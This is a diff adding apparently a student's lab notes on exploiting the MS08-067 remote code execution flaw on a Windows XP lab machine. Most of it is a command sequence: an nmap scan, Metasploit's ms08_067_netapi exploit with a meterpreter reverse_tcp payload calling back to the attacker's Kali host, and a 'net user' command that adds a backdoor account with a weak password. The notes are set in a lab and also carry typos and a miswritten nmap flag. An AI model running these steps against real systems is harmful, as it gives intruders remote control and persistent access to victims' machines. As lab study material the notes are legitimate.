@@ -1,0 +1,43 @@
+Ecploiting remote code executing vulnerability on windows platform and getting 
+remote access of vicim's machine
+
+Lab environment :system having windows
+tools : nmap ,metasploit (meterpreter)
+procedure:
+network saclling :
+footprinting:
+find a vulnerable target and identify vulnerability :
+execute exploit
+catch responcse:
+
+
+
+
+
+
+
+nmap 10.10.10.2 -sv
+
+search ms08_067
+
+use exploit/windows/smb/ms08_067_netapi
+
+show payloads
+
+set payload windows/meterpreter/reverse_tcp
+
+show options
+
+set RHOSTS 10.10.10.4  -xp ip
+
+set LHOST 10.10.10.2  -kali ip
+
+show targets
+
+show options
+
+exploit
+
+pwd
+
+net user shivali 123 /ADD
